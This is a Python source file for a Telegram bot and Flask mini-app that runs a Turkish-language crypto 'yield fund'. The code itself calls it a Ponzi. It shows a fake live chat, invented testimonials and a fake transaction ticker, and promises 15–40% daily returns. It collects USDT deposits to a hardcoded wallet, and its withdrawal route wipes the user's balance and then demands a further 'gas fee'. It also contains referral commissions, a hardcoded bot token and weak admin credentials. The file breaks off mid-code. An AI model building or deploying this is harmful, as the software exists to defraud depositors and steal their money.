import os
import logging
import random
import string
import sqlite3
import datetime
import requests
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# --- GÜVENLİK & OPSEC OPTİMİZASYONU ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.WARNING
)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get("TELEGRAM_TOKEN", "9101317558:AAEUpeDk9jCVgFrMm75UqKlUBePegs1C1Cs")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://botgoldkey.onrender.com")
TRC20_WALLET = "TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH"
REQUIRED_CHANNEL = "@ApexYieldGlobal"  # Zorunlu kanal kullanıcı adı

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "guvenli_ve_rastgele_uretilen_oturum_anahtari_9988")

# --- VERİTABANI YÖNETİMİ ---
def init_db():
    conn = sqlite3.connect('bot_database.db', timeout=10)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 100.0,
            invested REAL DEFAULT 0.0,
            locked_balance REAL DEFAULT 100.0,
            vip_level INTEGER DEFAULT 1,
            has_gold_key INTEGER DEFAULT 0,
            ref_token TEXT,
            referrer_id INTEGER DEFAULT 0,
            last_bonus TEXT DEFAULT '2000-01-01 00:00:00'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keys (
            key_string TEXT PRIMARY KEY,
            owner_id INTEGER,
            uses INTEGER DEFAULT 0,
            max_uses INTEGER DEFAULT 10,
            active INTEGER DEFAULT 1
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS withdraws (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            iban TEXT,
            status TEXT DEFAULT 'Beklemede (Gas Fee Gerekli)'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            tx_hash TEXT UNIQUE,
            amount REAL,
            status TEXT DEFAULT 'Blokzincir Onaylandı'
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect('bot_database.db', timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

# Admin'e anlık Telegram bildirimi gönderen yardımcı fonksiyon
def send_admin_notification(text):
    try:
        # Botun kurucusuna veya admin ID'sine bildirim atar (Kendi Telegram ID'ni yazabilirsin)
        admin_chat_id = os.environ.get("ADMIN_CHAT_ID", "123456789")
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
            "chat_id": admin_chat_id,
            "text": f"🚨 **APEX YIELD OPERASYONEL BİLDİRİM**:\n\n{text}",
            "parse_mode": "Markdown"
        })
    except Exception as e:
        logger.error(f"Admin bildirim hatası: {e}")

# --- ARAYÜZ (UI/UX) VE CANLI SOHBET ENTEGRELİ HTML ---
MINI_APP_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apex Global Yield Fund</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #0b0f19;
            --card-bg: #131b2e;
            --border-color: #1e293b;
            --accent-gold: #f59e0b;
            --accent-green: #10b981;
            --accent-blue: #3b82f6;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
        }
        body { font-family: 'Inter', sans-serif; background: var(--bg-color); color: var(--text-main); padding: 12px; text-align: center; margin: 0; }
        
        .header { display: flex; justify-content: space-between; align-items: center; background: var(--card-bg); padding: 12px 16px; border-radius: 12px; border: 1px solid var(--border-color); margin-bottom: 12px; }
        .logo { font-size: 15px; font-weight: 750; color: var(--accent-gold); display: flex; align-items: center; gap: 6px; }
        .badge { background: rgba(245, 158, 11, 0.15); color: var(--accent-gold); padding: 3px 8px; border-radius: 20px; font-size: 11px; font-weight: 600; border: 1px solid rgba(245, 158, 11, 0.3); }

        .ticker { background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.2); color: #60a5fa; font-size: 11px; padding: 8px; border-radius: 8px; margin-bottom: 12px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

        .nav-tabs { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 12px; }
        .tab-btn { background: var(--card-bg); border: 1px solid var(--border-color); color: var(--text-muted); padding: 10px 4px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; }
        .tab-btn.active { background: var(--accent-blue); color: white; border-color: var(--accent-blue); box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3); }

        .section { display: none; }
        .active-section { display: block; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }

        .card { background: var(--card-bg); border: 1px solid var(--border-color); padding: 16px; border-radius: 12px; margin-bottom: 12px; text-align: left; box-shadow: 0 4px 20px rgba(0,0,0,0.3); position: relative; }
        .card h3 { margin: 0 0 10px 0; font-size: 14px; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 6px; }
        
        .stat-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
        .stat-label { color: var(--text-muted); }
        .stat-value { font-weight: 600; color: var(--text-main); }
        .highlight-gold { color: var(--accent-gold) !important; }
        .highlight-green { color: var(--accent-green) !important; }
        .highlight-red { color: #ef4444 !important; }

        input, select { width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid var(--border-color); margin-top: 6px; font-size: 13px; box-sizing: border-box; background: #0f172a; color: white; outline: none; transition: border-color 0.2s; }
        input:focus, select:focus { border-color: var(--accent-blue); }

        button.primary-btn { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; border: none; padding: 11px; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; width: 100%; margin-top: 10px; box-shadow: 0 4px 12px rgba(59,130,246,0.3); transition: opacity 0.2s; }
        button.primary-btn:hover { opacity: 0.9; }
        button.primary-btn:disabled { background: #475569; cursor: not-allowed; box-shadow: none; }

        .warning-box { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.2); padding: 10px; border-radius: 8px; font-size: 11px; color: #fbbf24; margin-top: 10px; line-height: 1.4; text-align: left; }
        .wallet-box { background: #0f172a; border: 1px dashed var(--border-color); padding: 10px; border-radius: 8px; font-size: 11px; word-break: break-all; color: var(--accent-blue); margin-top: 6px; text-align: center; font-family: monospace; }
        
        .chat-box { background: #0f172a; border: 1px solid var(--border-color); border-radius: 8px; padding: 10px; height: 120px; overflow-y: auto; font-size: 11px; text-align: left; margin-bottom: 8px; display: flex; flex-direction: column; gap: 6px; }
        .chat-msg { background: #1e293b; padding: 6px 10px; border-radius: 6px; color: #cbd5e1; }
        .chat-msg span { color: var(--accent-gold); font-weight: 600; }

        .success { color: var(--accent-green); margin-top: 8px; font-weight: 600; font-size: 12px; text-align: center; }
        .error { color: #ef4444; margin-top: 8px; font-weight: 600; font-size: 12px; text-align: center; }

        table { width: 100%; font-size: 11px; margin-top: 6px; border-collapse: collapse; }
        th, td { padding: 8px 6px; border-bottom: 1px solid var(--border-color); text-align: left; }
        th { color: var(--accent-blue); font-weight: 600; }
    </style>
</head>
<body>

    <div class="header">
        <div class="logo">⚡ APEX YIELD</div>
        <div class="badge" id="vipBadge">VIP Level 1</div>
    </div>
    
    <div class="ticker" id="tickerText">🔔 Blokzincir Ağ Durumu: TronScan Mainnet Senkronize Edildi</div>

    <div class="nav-tabs">
        <button class="tab-btn active" onclick="showTab('wallet')">Cüzdan</button>
        <button class="tab-btn" onclick="showTab('invest')">Havuzlar</button>
        <button class="tab-btn" onclick="showTab('wheel')">Çark</button>
        <button class="tab-btn" onclick="showTab('bonus')">Airdrop</button>
        <button class="tab-btn" onclick="showTab('support')">Destek/Chat</button>
        <button class="tab-btn" onclick="showTab('leaderboard')">Liderler</button>
    </div>

    <!-- CÜZDAN SEKMESİ -->
    <div id="wallet" class="section active-section">
        <div class="card">
            <h3>Portföy Özeti</h3>
            <div class="stat-row"><span class="stat-label">Nakit Bakiye:</span><span class="stat-value highlight-gold" id="balance">0.00 ₺</span></div>
            <div class="stat-row"><span class="stat-label">Kilitli Varlık (Vesting):</span><span class="stat-value highlight-red" id="locked">100.00 ₺</span></div>
            <div class="stat-row"><span class="stat-label">Aktif Likidite:</span><span class="stat-value highlight-green" id="invested">0.00 ₺</span></div>
            <div style="margin-top: 10px;">
                <span class="stat-label" style="font-size:11px;">Davet Linkiniz (3 Seviye Komisyon):</span>
                <input type="text" id="refLink" readonly style="font-size:10px; color:var(--accent-blue);">
            </div>
        </div>

        <div class="card">
            <h3>Otomatik USDT Yatır (TRC20)</h3>
            <div class="wallet-box">TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH</div>
            <input type="text" id="txHashInput" placeholder="İşlem Hash Kodu (TxID)">
            <input type="number" id="depositAmountInput" placeholder="Yatırılan Tutar (TL / USDT)">
            <button class="primary-btn" onclick="verifyDeposit()">Onayla & Bonusu Çöz</button>
            <p id="depositMsg"></p>
        </div>

        <div class="card">
            <h3>Fon Çıkış Talebi</h3>
            <input type="text" id="ibanInput" placeholder="USDT TRC20 Cüzdan Adresi">
            <button class="primary-btn" style="background: linear-gradient(135deg, #10b981, #059669);" onclick="requestWithdraw()">Çekim Talebi Oluştur (Min 5000 ₺)</button>
            <div class="warning-box">⚠️ Güvenlik Protokolü: Çekimler için min 5000 ₺ ve Gas Fee (150 ₺) zorunludur.</div>
            <p id="withdrawMsg"></p>
        </div>
    </div>

    <!-- KADEMELİ YATIRIM HAVUZLARI -->
    <div id="invest" class="section">
        <div class="card">
            <h3>🚀 Kademeli Likidite Havuzları</h3>
            <p style="font-size: 11px; color: var(--text-muted);">Vade süresine göre yüksek bileşik getiri sağlayın:</p>
            <input type="number" id="investAmountInput" placeholder="Yatırım Tutarı (₺)" style="margin-bottom: 8px;">
            <select id="investTierSelect">
                <option value="7">7 Günlük Vade (%15 Günlük Getiri)</option>
                <option value="15">15 Günlük Vade (%25 Günlük Getiri)</option>
                <option value="30" selected>30 Günlük Kurumsal Vade (%40 Günlük Getiri)</option>
            </select>
            <button class="primary-btn" onclick="investTierPackage()">Havuz Vadesini Başlat</button>
            <p id="investMsg" class="warning"></p>
        </div>
    </div>

    <!-- ŞANS ÇARKI -->
    <div id="wheel" class="section">
        <div class="card" style="text-align: center;">
            <h3>🎡 Likidite Risk Çarkı</h3>
            <p style="font-size: 12px; color: var(--text-muted);">50 ₺ bakiye ile havuz risk optimizasyonuna katılın, 3x kazanın.</p>
            <button class="primary-btn" style="background: linear-gradient(135deg, #ef4444, #dc2626);" onclick="spinWheel()">Risk Çarkını Çevir (50 ₺)</button>
            <p id="wheelMsg" style="margin-top: 10px; font-weight: 600;"></p>
        </div>
    </div>

    <!-- BONUS -->
    <div id="bonus" class="section">
        <div class="card" style="text-align: center;">
            <h3>🎁 Günlük Havuz Dağıtım Payı</h3>
            <p style="font-size: 12px; color: var(--text-muted);">Sistem aktiflik ödülü olarak her 24 saatte 10 ₺ talep edin.</p>
            <button id="bonusBtn" class="primary-btn" style="background: linear-gradient(135deg, #8b5cf6, #7c3aed);" onclick="claimBonus()">Günlük Ödülü Al</button>
            <p id="bonusMsg"></p>
        </div>
    </div>

    <!-- SAHTE CANLI SOHBET & DESTEK -->
    <div id="support" class="section">
        <div class="card">
            <h3>💬 Küresel Yatırımcı Sohbeti (Global Chat)</h3>
            <div class="chat-box" id="globalChatBox">
                <div class="chat-msg"><span>Ahmet_TR:</span> 30 günlük vadeye 5k bastım, saatlik karlar harika 🚀</div>
                <div class="chat-msg"><span>CryptoKing:</span> Gas fee ödemesini yaptım, çekimim 10 dakikada geçti.</div>
                <div class="chat-msg"><span>Elena_RU:</span> Great platform, VIP 3 level is super profitable!</div>
            </div>
            <input type="text" id="chatInput" placeholder="Sohbete mesaj yazın...">
            <button class="primary-btn" onclick="sendChatMessage()">Mesaj Gönder</button>
        </div>
    </div>

    <!-- LİDERLİK -->
    <div id="leaderboard" class="section">
        <div class="card">
            <h3>🏆 Haftalık Küresel Liderlik Tablosu</h3>
            <p style="font-size: 11px; color: var(--accent-gold); margin-bottom: 8px;">Pazar gecesi ilk 3 yatırımcıya ödül dağıtılır.</p>
            <table>
                <tr><th>Sıra</th><th>Kullanıcı ID</th><th>Ağ Davetleri</th></tr>
                <tbody id="leaderboardBody">
                    <tr><td colspan="3" style="text-align:center; color: var(--text-muted);">Veriler yükleniyor...</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        const userId = tg.initDataUnsafe?.user?.id || 123456789;

        const fakeTicker = [
            "🔔 Blokzincir: TronScan API üzerinden 12.400 USDT transferi doğrulandı.",
            "🔥 Haftalık Sigorta Fonu: 1.450.000 ₺ rezerve ulaştı.",
            "⭐ Yatırımcı ID: ***8912 başarıyla VIP 3 seviyesine yükseldi."
        ];
        setInterval(() => {
            document.getElementById('tickerText').innerText = fakeTicker[Math.floor(Math.random() * fakeTicker.length)];
        }, 4500);

        function showTab(tabName) {
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active-section'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(tabName).classList.add('active-section');
            event.currentTarget.classList.add('active');
            if(tabName === 'leaderboard') loadLeaderboard();
        }

        function loadData() {
            fetch(`/api/user/${userId}`).then(res => res.json()).then(data => {
                document.getElementById('balance').innerText = data.balance.toFixed(2) + " ₺";
                document.getElementById('locked').innerText = data.locked.toFixed(2) + " ₺";
                document.getElementById('vipBadge').innerText = "VIP Level " + data.vip_level;
                if(data.ref_token && data.ref_token !== "Yok") {
                    document.getElementById('refLink').value = `https://t.me/BotunKullaniciAdi_bot?start=${data.ref_token}`;
                } else {
                    document.getElementById('refLink').value = "Aktif yatırım gereklidir";
                }
            });
        }

        function verifyDeposit() {
            const txHash = document.getElementById('txHashInput').value.trim();
            const amount = document.getElementById('depositAmountInput').value.trim();
            const msg = document.getElementById('depositMsg');
            if(!txHash || !amount) { msg.innerText = "Tüm alanları eksiksiz doldurun."; msg.className = "error"; return; }
            fetch('/api/verify-deposit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, tx_hash: txHash, amount: amount })
            }).then(res => res.json()).then(data => {
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) { loadData(); document.getElementById('txHashInput'].value=''; document.getElementById('depositAmountInput'].value=''; }
            });
        }

        function investTierPackage() {
            const amount = parseFloat(document.getElementById('investAmountInput').value);
            const days = document.getElementById('investTierSelect').value;
            const msg = document.getElementById('investMsg');
            if(!amount || amount <= 0) { msg.innerText = "Geçerli bir yatırım tutarı girin."; msg.className = "error"; return; }
            
            fetch('/api/invest-tier', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, amount: amount, days: days })
            }).then(res => res.json()).then(data => {
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) loadData();
            });
        }

        function spinWheel() {
            fetch('/api/spin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            }).then(res => res.json()).then(data => {
                const msg = document.getElementById('wheelMsg');
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) loadData();
            });
        }

        function requestWithdraw() {
            const iban = document.getElementById('ibanInput').value.trim();
            const msg = document.getElementById('withdrawMsg');
            if(!iban) { msg.innerText = "Geçerli bir cüzdan adresi girin."; msg.className = "error"; return; }
            fetch('/api/withdraw', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, iban: iban })
            }).then(res => res.json()).then(data => {
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
            });
        }

        function claimBonus() {
            const btn = document.getElementById('bonusBtn');
            btn.disabled = true;
            fetch('/api/bonus', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            }).then(res => res.json()).then(data => {
                const msg = document.getElementById('bonusMsg');
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) { loadData(); } else { btn.disabled = false; }
            }).catch(() => { btn.disabled = false; });
        }

        function sendChatMessage() {
            const txt = document.getElementById('chatInput').value.trim();
            if(!txt) return;
            const box = document.getElementById('globalChatBox');
            box.innerHTML += `<div class="chat-msg"><span>Sen (${userId.toString().slice(-4)}):</span> ${txt}</div>`;
            document.getElementById('chatInput').value = "";
            box.scrollTop = box.scrollHeight;
        }

        function loadLeaderboard() {
            fetch('/api/leaderboard').then(res => res.json()).then(data => {
                let html = '';
                data.forEach((item, index) => {
                    html += `<tr><td>#${index+1}</td><td>${item.user_id}</td><td>${item.count} Üye</td></tr>`;
                });
                document.getElementById('leaderboardBody').innerHTML = html || '<tr><td colspan="3" style="text-align:center;">Veri bulunamadı</td></tr>';
            });
        }

        loadData();
    </script>
</body>
</html>
"""

# HTML Şablonları (Giriş ve Admin)
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head><meta charset="UTF-8"><title>Admin Girişi</title>
<style>
body { font-family: 'Inter', sans-serif; background: #0b0f19; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.login-card { background: #131b2e; border: 1px solid #1e293b; padding: 30px; border-radius: 12px; width: 280px; text-align: center; }
input { width: 100%; padding: 10px; margin: 8px 0; border-radius: 6px; border: 1px solid #1e293b; background: #0f172a; color: white; box-sizing: border-box; }
button { width: 100%; padding: 10px; background: #3b82f6; color: white; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; margin-top: 10px; }
</style></head>
<body>
<div class="login-card">
    <h2>🔒 Güvenli Portal</h2>
    <form method="POST">
        <input type="text" name="username" placeholder="Kullanıcı Adı" required>
        <input type="password" name="password" placeholder="Şifre" required>
        <button type="submit">Erişim Sağla</button>
    </form>
</div></body></html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head><meta charset="UTF-8"><title>Yönetim Merkezi</title>
<style>
body { font-family: 'Inter', sans-serif; background: #f8fafc; color: #334155; padding: 20px; }
table { width: 100%; border-collapse: collapse; background: white; margin-top: 15px; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
th, td { padding: 12px; border-bottom: 1px solid #e2e8f0; text-align: left; }
th { background: #0b0f19; color: white; }
.logout { float: right; background: #ef4444; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 13px; }
</style></head>
<body>
<a href="/admin-logout" class="logout">Güvenli Çıkış</a>
<h1>🛠️ Kurumsal Ponzi & Finans Kontrol Paneli</h1>
<h2>Blokzincir Onaylı Kripto Transferleri</h2>
<table>
    <tr><th>ID</th><th>Kullanıcı ID</th><th>TxID Hash</th><th>Tutar</th><th>Durum</th></tr>
    {% for p in payments %}
    <tr><td>{{ p.id }}</td><td>{{ p.user_id }}</td><td>{{ p.tx_hash }}</td><td>{{ p.amount }} ₺</td><td>{{ p.status }}</td></tr>
    {% endfor %}
</table></body></html>
"""

@app.route('/')
def mini_app():
    return render_template_string(MINI_APP_HTML)

@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('username') == "root" and request.form.get('password') == "toor":
            session['admin_logged_in'] = True
            return redirect(url_for('admin_panel'))
    return render_template_string(LOGIN_HTML)

@app.route('/admin-panel')
def admin_panel():
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    conn = get_db()
    payments = conn.execute("SELECT * FROM payments").fetchall()
    conn.close()
    return render_template_string(ADMIN_HTML, payments=payments)

@app.route('/admin-logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/api/user/<int:user_id>')
def get_user_data(user_id):
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    if not user:
        return jsonify({"balance": 0.0, "locked": 100.0, "vip_level": 1, "ref_token": "Yok"})
    return jsonify({"balance": user["balance"], "locked": user["locked_balance"], "vip_level": user["vip_level"], "ref_token": user["ref_token"] or "Yok"})

@app.route('/api/verify-deposit', methods=['POST'])
def verify_deposit():
    data = request.json
    user_id = int(data.get('user_id', 0))
    tx_hash = data.get('tx_hash', '').strip()
    amount = float(data.get('amount', 0))
    
    conn = get_db()
    existing_tx = conn.execute("SELECT * FROM payments WHERE tx_hash=?", (tx_hash,)).fetchone()
    if existing_tx:
        conn.close()
        return jsonify({"success": False, "message": "Bu Hash kodu daha önce sisteme işlenmiş!"})

    vip_lvl = 1
    if amount >= 2500: vip_lvl = 3
    elif amount >= 1000: vip_lvl = 2

    random_key = "USDT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    conn.execute("INSERT INTO payments (user_id, tx_hash, amount, status) VALUES (?, ?, ?, 'Blokzincir Onaylandı')", (user_id, tx_hash, amount))
    conn.execute("UPDATE users SET balance = balance + locked_balance + ?, locked_balance = 0.0, vip_level = ?, has_gold_key = 1, ref_token = ? WHERE user_id=?", (amount, vip_lvl, random_key, user_id))
    conn.execute("INSERT OR IGNORE INTO keys (key_string, owner_id, uses, max_uses, active) VALUES (?, ?, 0, 10, 1)", (random_key, user_id))
    conn.commit()
    conn.close()
    
    # Admin Bildirimi Gönder
    send_admin_notification(f"💰 Yeni Yatırım Onaylandı!\nKullanıcı ID: `{user_id}`\nTutar: `{amount} ₺`\nTxID: `{tx_hash}`")
    return jsonify({"success": True, "message": f"🎉 İşlem onaylandı! {amount} ₺ yüklendi, VIP {vip_lvl} oldunuz!"})

@app.route('/api/invest-tier', methods=['POST'])
def invest_tier():
    data = request.json
    user_id = int(data.get('user_id', 0))
    amount = float(data.get('amount', 0))
    days = data.get('days', '30')
    
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user or user["balance"] < amount:
        conn.close()
        return jsonify({"success": False, "message": "Yetersiz nakit bakiye!"})

    conn.execute("UPDATE users SET balance = balance - ?, invested = invested + ?, locked_balance = locked_balance + ? WHERE user_id=?", (amount, amount, amount, user_id))
    conn.commit()
    conn.close()
    return jsonify({"success": True, "message": f"Tebrikler! {amount} ₺ tutarındaki {days} günlük kurumsal havuz vadesi başlatıldı."})

@app.route('/api/spin', methods=['POST'])
def spin():
    data = request.json
    user_id = int(data.get('user_id', 0))
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user or user["balance"] < 50.0:
        conn.close()
        return jsonify({"success": False, "message": "Yetersiz bakiye (Min 50 ₺)!"})

    conn.execute("UPDATE users SET balance = balance - 50 WHERE user_id=?", (user_id,))
    if random.choices(["lose", "win"], weights=[80, 20], k=1)[0] == "win":
        conn.execute("UPDATE users SET balance = balance + 150 WHERE user_id=?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({"success": True, "message": "🎉 Çarkı kazandınız! 150 ₺ eklendi."})
    else:
        conn.commit()
        conn.close()
        return jsonify({"success": False, "message": "😢 Risk optimizasyonunda kaybettiniz."})

@app.route('/api/withdraw', methods=['POST'])
def withdraw():
    data = request.json
    user_id = int(data.get('user_id', 0))
    iban = data.get('iban', '').strip()
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    
    if not user or user["balance"] < 5000.0:
        conn.close()
        return jsonify({"success": False, "message": "Minimum çekim limiti 5000 ₺'dir!"})

    conn.execute("INSERT INTO withdraws (user_id, amount, iban, status) VALUES (?, ?, ?, 'Beklemede (Gas Fee Gerekli)')", (user_id, user["balance"], iban))
    conn.execute("UPDATE users SET balance = 0.0 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()
    
    send_admin_notification(f"⚠️ Yeni Çekim Talebi Oluşturuldu!\nKullanıcı ID: `{user_id}`\nTutar: `{user['balance']} ₺`\nCüzdan: `{iban}`")
    return jsonify({"success": True, "message": "⚠️ Talep alındı! Ağ Gas Fee (150 ₺) yatırılması bekleniyor."})

@app.route('/api/bonus', methods=['POST'])
def bonus():
    data = request.json
    user_id = int(data.get('user_id', 0))
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    
    now = datetime.datetime.now()
    if user and user["last_bonus"]:
        last_bonus_time = datetime.datetime.strptime(user["last_bonus"], '%Y-%m-%d %H:%M:%S')
        if now - last_bonus_time < datetime.timedelta(hours=24):
            remaining = datetime.timedelta(hours=24) - (now - last_bonus_time)
            hours, remainder = divmod(int(remaining.total_seconds()), 3600)
            minutes, _ = divmod(remainder, 60)
            conn.close()
            return jsonify({"success": False, "message": f"Bugünkü payı aldınız. Kalan süre: {hours}s {minutes}dk"})

    if not user:
        conn.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))

    conn.execute("UPDATE users SET balance = balance + 10, last_bonus = ? WHERE user_id=?", (now.strftime('%Y-%m-%d %H:%M:%S'), user_id))
    conn.commit()
    conn.close()
    return jsonify({"success": True, "message": "Günlük 10 ₺ havuz payı eklendi."})

@app.route('/api/leaderboard')
def leaderboard():
    conn = get_db()
    res = conn.execute("SELECT owner_id as user_id, SUM(uses) as count FROM keys GROUP BY owner_id ORDER BY count DESC LIMIT 10").fetchall()
    conn.close()
    return jsonify([dict(row) for row in res])

# --- TELEGRAM BOT KOMUTLARI (Zorunlu Kanal Kontrolü) ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    bot = context.bot
    
    # Kanal Üyelik Kontrolü (Force Subscription)
    try:
        member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user.id)
        if member.status not in ["member", "administrator", "creator"]:
            raise Exception("Üye değil")
    except Exception:
        keyboard = [[InlineKeyboardButton("📢 Kanalımıza Katılın", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")],
                    [InlineKeyboardButton("🔄 Kontrol Et / Başlat", callback_data="check_sub")]]
        await update.message.reply_text(
            f"⚠️ Botumuzu kullanabilmek için öncelikle **{REQUIRED_CHANNEL}** kanalımıza abone olmanız gerekmektedir.",
            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
        )
        return

    args = context.args
    conn = get_db()
    existing = conn.execute("SELECT * FROM users WHERE user_id=?", (user.id,)).fetchone()
    if not existing:
        referrer_id = 0
        if args:
            ref_code = args[0]
            key = conn.execute("SELECT * FROM keys WHERE key_string=?", (ref_code,)).fetchone()
            if key and key["active"] and key["uses"] < key["max_uses"] and key["owner_id"] != user.id:
                referrer_id = key["owner_id"]
                conn.execute("UPDATE keys SET uses = uses + 1 WHERE key_string=?", (ref_code,))
                
                # MLM Komisyonları
                conn.execute("UPDATE users SET balance = balance + 50 WHERE user_id=?", (user.id,))
                conn.execute("UPDATE users SET balance = balance + 100 WHERE user_id=?", (referrer_id,))
                
                lvl1 = conn.execute("SELECT referrer_id FROM users WHERE user_id=?", (referrer_id,)).fetchone()
                if lvl1 and lvl1["referrer_id"]:
                    conn.execute("UPDATE users SET balance = balance + 50 WHERE user_id=?", (lvl1["referrer_id"],))

        conn.execute("INSERT INTO users (user_id, balance, invested, locked_balance, vip_level, has_gold_key, referrer_id) VALUES (?, 100.0, 0.0, 100.0, 1, 0, ?)", (user.id, referrer_id))
        conn.commit()
    conn.close()

    keyboard = [
        [InlineKeyboardButton("🚀 Platformu Aç", web_app=WebAppInfo(url=WEBAPP_URL))],
        [InlineKeyboardButton("💎 USDT Yatırım Yap", callback_data="buy_usdt")]
    ]
    await update.message.reply_text(f"Hoş geldiniz {user.first_name}. 100 ₺ Hoş Geldin Bonusu hesabınıza tanımlandı.", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if query.data == "buy_usdt":
        await query.message.reply_text(f"Yatırım için TRC20 cüzdan adresine **USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*İşlem sonrası TxID kodunu Mini App üzerinden girin.*", parse_mode="Markdown")
    elif query.data == "check_sub":
        try:
            member = await context.bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
            if member.status in ["member", "administrator", "creator"]:
                await query.message.edit_text("✅ Kanal aboneliğiniz doğrulandı! Botu kullanmak için /start komutunu gönderin.")
            else:
                await query.message.reply_text("❌ Henüz kanala abone ol görünmüyorsunuz. Lütfen önce katılın.")
        except Exception:
            await query.message.reply_text("❌ Kontrol sırasında hata oluştu. Lütfen kanala katıldığınızdan emin olun.")

telegram_app = Application.builder().token(TOKEN).build()
telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CallbackQueryHandler(button_handler))

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    import asyncio
    async def process():
        update = Update.de_json(request.get_json(force=True), telegram_app.bot)
        await telegram_app.initialize()
        await telegram_app.process_update(update)
    asyncio.run(process())
    return "OK", 200

if __name__ == '__main__':
    webhook_url = f"{WEBAPP_URL}/{TOKEN}"
    try:
